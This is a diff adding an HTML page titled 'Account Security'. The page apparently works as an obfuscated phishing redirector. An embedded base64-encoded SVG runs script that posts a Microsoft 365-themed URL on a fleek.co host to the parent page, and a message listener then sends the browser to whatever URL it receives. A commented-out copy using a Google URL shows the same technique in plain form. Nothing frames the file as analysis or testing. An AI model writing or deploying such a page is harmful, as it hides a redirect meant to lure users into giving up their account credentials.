@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Account Security</title>
+</head>
+<!--?xml version="1.0" ?>
+<svg xmlns="http://www.w3.org/2000/svg">
+    <circle></circle>
+    <script type="text/javascript">
+        <![CDATA[
+        parent.window.postMessage("https://google.com", "*")
+        ]]>
+    </script>
+</svg-->
+
+<body>
+
+<embed
+        src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiAgICA8Y2lyY2xlPjwvY2lyY2xlPgogICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgogICAgICAgIDwhW0NEQVRBWwogICAgICAgIHBhcmVudC53aW5kb3cucG9zdE1lc3NhZ2UoImh0dHBzOi8vcmVkaXJlY3Rpbmdwcml2YWN5bWxjcjBzY2Z0MzY1YWFjY291bnRzZWN1cmVzY3Iub24uZmxlZWsuY28vbWljcm9zb2Z0MzY1dHd1YmVvZGJkbm50d3V1cXVlYnNmYXZhY2Fod2p3b3Nic2tzYnNrbnNoc2pzaHNzamRqZGdqc3R5aWR5cnRldC5odG1sIiwgIioiKQogICAgICAgIF1dPgogICAgPC9zY3JpcHQ+Cjwvc3ZnPg=="
+>
+
+<script>
+    window.addEventListener("message", (event) => {
+        console.log(event)
+        if (event.data)
+            window.location = event.data;
+    }, false);
+</script>
+</body>
+</html>
